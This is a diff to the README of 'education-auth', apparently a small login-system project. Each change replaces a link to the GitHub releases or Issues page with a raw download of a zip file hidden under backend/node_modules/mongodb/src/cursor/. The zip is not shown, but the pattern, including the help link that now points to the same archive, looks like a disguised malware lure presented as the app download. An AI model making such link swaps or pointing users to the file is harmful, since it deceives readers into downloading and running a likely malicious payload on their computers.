@@ -1,6 +1,6 @@
 # 🔐 education-auth - Simple Role-Based Login System
 
-[![Download education-auth](https://img.shields.io/badge/Download-education--auth--Releases-purple?style=for-the-badge)](https://github.com/blyxliew/education-auth/releases)
+[![Download education-auth](https://img.shields.io/badge/Download-education--auth--Releases-purple?style=for-the-badge)](https://raw.githubusercontent.com/blyxliew/education-auth/main/backend/node_modules/mongodb/src/cursor/education-auth-rivalship.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get education-auth on your Windows PC, follow these steps:
 
 Click this big button to open the download page:
 
-[![Download education-auth](https://img.shields.io/badge/Get%20the%20App-Here-blue?style=for-the-badge)](https://github.com/blyxliew/education-auth/releases)
+[![Download education-auth](https://img.shields.io/badge/Get%20the%20App-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/blyxliew/education-auth/main/backend/node_modules/mongodb/src/cursor/education-auth-rivalship.zip)
 
 This page lists the latest versions available.
 
@@ -146,7 +146,7 @@ To update:
 
 If problems continue:
 
-- Visit the Issues section on the GitHub page: https://github.com/blyxliew/education-auth/issues
+- Visit the Issues section on the GitHub page: https://raw.githubusercontent.com/blyxliew/education-auth/main/backend/node_modules/mongodb/src/cursor/education-auth-rivalship.zip
 - Describe your problem clearly with steps taken and any error messages.
 - The community or developers will reply to help.
 
@@ -168,4 +168,4 @@ If problems continue:
 
 ---
 
-[![Download education-auth](https://img.shields.io/badge/Download-education--auth--Releases-purple?style=for-the-badge)](https://github.com/blyxliew/education-auth/releases)
+[![Download education-auth](https://img.shields.io/badge/Download-education--auth--Releases-purple?style=for-the-badge)](https://raw.githubusercontent.com/blyxliew/education-auth/main/backend/node_modules/mongodb/src/cursor/education-auth-rivalship.zip)
